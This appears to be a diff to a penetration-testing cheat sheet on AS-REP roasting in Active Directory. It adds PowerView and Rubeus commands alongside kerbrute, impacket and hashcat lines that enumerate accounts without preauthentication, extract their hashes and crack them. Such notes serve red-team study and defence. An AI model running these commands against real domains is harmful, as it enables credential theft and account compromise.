@@ -126,8 +126,14 @@ sudo rdate -n target_IP
 # Using kerbrute
 kerbrute userenum -d $DOMAIN --dc $DC_IP valid_users_list 
 
+# Using powerview
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
 # Using impacket toolkit
 GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile valid_ad_users 
+
+# Using rubeus
+Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 
 # Cracking the password
 hashcat -m 18200 hash wordlist
